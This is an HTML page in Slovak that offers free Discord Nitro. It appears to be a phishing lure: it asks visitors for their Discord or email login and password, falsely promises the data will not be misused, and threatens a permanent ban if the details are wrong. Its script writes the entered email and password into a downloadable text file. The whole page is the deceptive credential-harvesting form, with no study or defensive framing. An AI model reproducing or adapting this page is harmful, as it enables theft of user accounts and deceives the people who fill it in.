<!DOCTYPE html>
<html lang="sk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Nitro</title>
    <style>
        body {
            background-image: url('https://fossbytes.com/wp-content/uploads/2022/03/what-is-discord-nitro.jpg');
            background-size: cover;
            background-position: center;
            color: white;
            padding-top: 100px; /* Posun pozadia nižšie */
        }
        .container {
            text-align: center;
            background-color: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
        }
    </style>
    <script>
        function downloadCredentials() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const blob = new Blob([`Email: ${email}\nHeslo: ${password}`], { type: 'text/plain' });
            const link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = 'Nitro-file.txt';
            link.click();
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Zadajte vaše prihlasovacie údaje od platformy Discord/Mail* (Vaše údaje nebudú zneužité!)</h1>
        <form onsubmit="event.preventDefault(); downloadCredentials();">
            <label for="email">Email:</label>
            <input type="email" id="email" required>
            <br>
            <label for="password">Heslo:</label>
            <input type="password" id="password" required>
            <br>
            <label for="length">Na akú dĺžku chcete Nitro:</label>
            <input type="text" id="length">
            <br>
            <label for="nickname">Váš nickname na Discorde**:</label>
            <input type="text" id="nickname">
            <br>
            <button type="submit">Získať</button>
        </form>
        <br>
        <h3>*Zadajte platné údaje! Ak budú údaje nesprávne, váš účet z dôvodu pokusu o zneužitie bude permanentne zablokovaný.</h3>
        <h3>**Len pokiaľ ste sa rozhodli zadať Discord údaje</h3>
    </div>
</body>
</html>
